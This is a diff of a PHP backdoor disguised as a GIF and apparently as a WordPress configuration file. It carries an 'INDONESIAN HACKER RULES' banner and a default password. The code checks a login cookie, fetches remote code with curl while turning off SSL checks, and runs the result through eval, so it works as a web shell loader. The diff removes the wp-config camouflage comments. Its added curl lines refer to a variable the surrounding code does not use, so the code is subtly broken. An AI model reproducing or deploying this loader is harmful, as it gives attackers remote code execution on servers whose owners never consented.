@@ -1,34 +1,15 @@
 GIF8root7a;
+
+
+<?php
 /*----------------------------------------------*/
 /////////////////////////////////////// //////////
 ///           INDONESIAN HACKER RULES           ///
 ///                11/08/2009                   ///
-///            Default pass: Bangke.             ///
-///				                                      ///
+///            Default pass: kemuye             ///
+///				                                  ///
 //////////////////////////////////////////////////
 /*----------------------------------------------*/
-
-
-<?php
-/**
- * The base configuration for WordPress
- *
- * The wp-config.php creation script uses this file during the installation.
- * You don't have to use the website, you can copy this file to "wp-config.php"
- * and fill in the values.
- *
- * This file contains the following configurations:
- *
- * * Database settings
- * * Secret keys
- * * Database table prefix
- * * ABSPATH
- *
- * @link https://developer.wordpress.org/advanced-administration/wordpress/wp-config/
- * @link https://developer.wordpress.org/advanced-administration/wordpress/wp-config/
- *
- * @package nuull
- *=/
 function is_logged_in()
 {
     return isset($_COOKIE['user_id']) && $_COOKIE['user_id'] === 'user123'; // Ganti 'user123' dengan nilai yang sesuai
@@ -47,7 +28,10 @@ function is_logged_in()
             curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
             curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
             curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
-
+            curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
+          curl_setopt($ch, CURLOPT_URL, $url);
+          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
+          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
             $urls = $cexec($conn);
             curl_close($conn);
         } elseif (function_exists($fgt)) {
@@ -66,11 +50,3 @@ function is_logged_in()
     eval('?>' . $a);
 
 ?>
-/*----------------------------------------------*/
-/////////////////////////////////////// //////////
-///           INDONESIAN HACKER RULES           ///
-///                11/08/2009                   ///
-///            Default pass: Bangke.             ///
-///				                                      ///
-//////////////////////////////////////////////////
-/*----------------------------------------------*/
